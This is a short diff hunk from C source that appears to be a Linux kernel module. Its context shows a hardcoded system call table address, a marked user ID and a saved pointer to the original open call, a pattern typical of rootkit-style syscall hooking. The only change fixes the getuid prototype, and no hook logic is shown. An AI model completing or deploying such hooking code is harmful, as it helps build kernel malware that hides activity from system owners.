@@ -53,7 +53,7 @@ unsigned long system_call_table_address = 0xffffffff81801400;
 int markUID = 1001;
 /* ================================================================ */
 
-asmlinkage int (*getuid)();
+asmlinkage int (*getuid)(void);
 
 asmlinkage int (*old_open) (const char*, int, int);
 
